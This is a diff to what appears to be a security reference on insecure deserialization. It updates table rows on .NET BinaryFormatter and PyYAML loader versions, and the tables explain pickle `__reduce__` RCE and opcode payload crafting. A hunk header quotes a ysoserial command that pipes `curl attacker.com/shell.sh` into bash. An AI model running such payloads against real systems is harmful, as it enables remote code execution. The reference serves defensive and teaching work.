@@ -197,7 +197,7 @@ Different serialization formats have distinct security properties. This section 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
 | **Java ObjectInputStream** | The canonical binary deserialization sink — `ObjectInputStream.readObject()` reconstructs arbitrary object graphs including type metadata, triggering `readObject()` callbacks | Application deserializes untrusted bytes via `ObjectInputStream` |
-| **.NET BinaryFormatter** | Microsoft-deprecated (exceptions thrown in .NET 9+) binary formatter that invokes deserialization callbacks; cannot be secured and should never be used with untrusted data | Legacy .NET application still using `BinaryFormatter` |
+| **.NET BinaryFormatter** | Microsoft-deprecated (exceptions thrown in .NET 8+; fully removed in .NET 9) binary formatter that invokes deserialization callbacks; cannot be secured and should never be used with untrusted data | Legacy .NET application still using `BinaryFormatter` |
 | **Python Pickle Protocol** | Stack-based VM that can execute arbitrary Python functions during deserialization via `__reduce__`; security by design is impossible — any pickle from untrusted source is exploitable | `pickle.loads()` on untrusted data, any Python version |
 | **Ruby Marshal** | Binary format that reconstructs arbitrary Ruby objects; `Marshal.load()` on untrusted data enables RCE via gadget chains in loaded libraries | `Marshal.load()` on untrusted data |
 | **PHP serialize/unserialize** | Text-based but structurally binary format encoding type, length, and value; `unserialize()` triggers `__wakeup()` and `__destruct()` on reconstructed objects | `unserialize()` on untrusted data |
@@ -426,7 +426,7 @@ java -jar ysoserial.jar CommonsCollections5 "curl attacker.com/shell.sh | bash"
 |---|---|---|
 | **Pickle __reduce__ RCE** | The canonical Python deserialization attack: `__reduce__` returns `(os.system, ("cmd",))` — the pickle VM directly calls the function with the supplied arguments; no gadget chain needed | `pickle.loads()` on untrusted data |
 | **Pickle Opcode Engineering** | Crafting raw pickle opcodes (GLOBAL, STACK_GLOBAL, INST, OBJ, REDUCE, BUILD) to construct complex payloads that evade high-level detection | Pickle opcode-level manipulation capability |
-| **PyYAML Code Execution** | `yaml.load()` with default `Loader` (pre-6.0) or `FullLoader` processes `!!python/object/apply` tags, enabling arbitrary function calls | Unsafe YAML loader on untrusted input |
+| **PyYAML Code Execution** | `yaml.load()` with unsafe default `Loader` (pre-5.1; FullLoader default 5.1–5.4 also had bypasses; explicit Loader required in 6.0+) processes `!!python/object/apply` tags, enabling arbitrary function calls | Unsafe YAML loader on untrusted input |
 | **Shelve/DBM Deserialization** | Python's `shelve` module uses pickle internally; opening an untrusted shelf file triggers arbitrary pickle deserialization | Application opens untrusted shelve/dbm files |
 | **Joblib Exploitation** | `joblib.load()` uses pickle for Python objects; widely used in ML pipelines for model persistence | Loading untrusted joblib files |
 
